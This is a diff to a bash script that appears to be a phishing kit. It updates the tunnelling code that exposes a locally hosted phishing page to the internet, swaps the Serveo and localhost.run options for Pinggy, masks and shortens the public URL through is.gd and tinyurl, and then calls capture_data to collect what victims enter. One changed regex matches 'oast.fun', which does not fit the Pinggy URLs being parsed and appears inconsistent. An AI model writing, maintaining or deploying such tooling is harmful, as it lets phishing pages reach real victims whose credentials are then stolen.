@@ -373,7 +373,6 @@ capture_data() {
 	done
 }
 
-## Start Cloudflared
 ## Install Cloudflared
 install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
@@ -399,13 +398,18 @@ start_cloudflared() {
 	echo -e "\n\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
 	if [[ $(command -v termux-chroot) ]]; then
-		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+		termux-chroot ./.server/cloudflared tunnel --url "http://$HOST:$PORT" --no-autoupdate > .server/.cld.log 2>&1 &
 	else
-		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+		./.server/cloudflared tunnel --url "http://$HOST:$PORT" --no-autoupdate > .server/.cld.log 2>&1 &
 	fi
 
+	echo -e "${CYAN}  Waiting for tunnel..."
 	sleep 8
-	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+	cldflr_url=$(grep -o 'https://[-a-z0-9]*\.trycloudflare\.com' .server/.cld.log | head -1)
+	if [[ -z "$cldflr_url" ]]; then
+		sleep 5
+		cldflr_url=$(grep -o 'https://[-a-z0-9]*\.trycloudflare\.com' .server/.cld.log | head -1)
+	fi
 	if [[ -z "$cldflr_url" ]]; then
 		echo -e "\n${MAGENTA}[${WHITE}!${RED}]${RED} Cloudflared failed. Try another option."
 		{ sleep 2; tunnel_menu; }
@@ -414,41 +418,31 @@ start_cloudflared() {
 	capture_data
 }
 
-## Start Serveo Tunnel
-start_serveo() {
+## Start Pinggy Tunnel
+start_pinggy() {
 	cusport
 	echo -e "\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -e "\n\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Launching Serveo..."
+	echo -e "\n\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Launching Pinggy..."
 
-	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:$HOST:$PORT serveo.net > .server/.serveo.log 2>&1 &
+	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
+		-R 80:localhost:$PORT pinggy@pinggy.io > .server/.pinggy.log 2>&1 &
+
 	echo -e "${CYAN}  Waiting for tunnel..."
-	sleep 10
-	serveo_url=$(grep -o 'https://[^ ]*serveo.net' .server/.serveo.log | head -1)
-	if [[ -z "$serveo_url" ]]; then
-		echo -e "\n${MAGENTA}[${WHITE}!${RED}]${RED} Serveo failed. Try another option."
+	sleep 12
+	pinggy_url=$(grep -o 'https://[a-z0-9.-]*\.u[0-9]*\.[a-z0-9]*\.[a-z0-9]*' .server/.pinggy.log | head -1)
+	if [[ -z "$pinggy_url" ]]; then
+		pinggy_url=$(grep -o 'https://[^ ]*oast[^ ]*\|https://[^ ]*tunnel[^ ]*' .server/.pinggy.log | head -1)
+	fi
+	if [[ -z "$pinggy_url" ]]; then
+		sleep 5
+		pinggy_url=$(grep -o 'https://[a-z0-9.-]*\.u[0-9]*\.[a-z0-9]*\.[a-z0-9]*' .server/.pinggy.log | head -1)
+	fi
+	if [[ -z "$pinggy_url" ]]; then
+		echo -e "\n${MAGENTA}[${WHITE}!${RED}]${RED} Pinggy failed. Try another option."
 		{ sleep 2; tunnel_menu; }
 	fi
-	custom_url "$serveo_url"
-	capture_data
-}
-
-## Start localhost.run Tunnel
-start_localrun() {
-	cusport
-	echo -e "\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; setup_site; }
-	echo -e "\n\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Launching LocalRun..."
-
-	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:$HOST:$PORT nokey@localhost.run > .server/.localrun.log 2>&1 &
-	echo -e "${CYAN}  Waiting for tunnel..."
-	sleep 10
-	localrun_url=$(grep -o 'https://[^ ]*lhr.life\|https://[^ ]*localhost.run' .server/.localrun.log | head -1)
-	if [[ -z "$localrun_url" ]]; then
-		echo -e "\n${MAGENTA}[${WHITE}!${RED}]${RED} LocalRun failed. Try another option."
-		{ sleep 2; tunnel_menu; }
-	fi
-	custom_url "$localrun_url"
+	custom_url "$pinggy_url"
 	capture_data
 }
 
@@ -469,8 +463,7 @@ tunnel_menu() {
 
 		${MAGENTA}[${WHITE}01${MAGENTA}]${CYAN} Localhost     ${RED}[${CYAN}Local only${RED}]
 		${MAGENTA}[${WHITE}02${MAGENTA}]${CYAN} Cloudflared   ${RED}[${CYAN}Fast & Free${RED}]
-		${MAGENTA}[${WHITE}03${MAGENTA}]${CYAN} Serveo        ${RED}[${CYAN}SSH Tunnel${RED}]
-		${MAGENTA}[${WHITE}04${MAGENTA}]${CYAN} LocalRun      ${RED}[${CYAN}SSH Tunnel${RED}]
+		${MAGENTA}[${WHITE}03${MAGENTA}]${CYAN} Pinggy        ${RED}[${CYAN}SSH Tunnel${RED}]
 
 	EOF
 
@@ -482,9 +475,7 @@ tunnel_menu() {
 		2 | 02)
 			start_cloudflared;;
 		3 | 03)
-			start_serveo;;
-		4 | 04)
-			start_localrun;;
+			start_pinggy;;
 		*)
 			echo -ne "\n${MAGENTA}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
@@ -528,7 +519,7 @@ custom_url() {
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
 	{ custom_mask; sleep 1; clear; banner_small; }
-	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|serveo.net|localhost.run|lhr.life) ]]; then
+	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|oast.fun) ]]; then
 		if [[ $(site_stat $isgd) == 2* ]]; then
 			shorten $isgd "$url"
 		elif [[ $(site_stat $shortcode) == 2* ]]; then
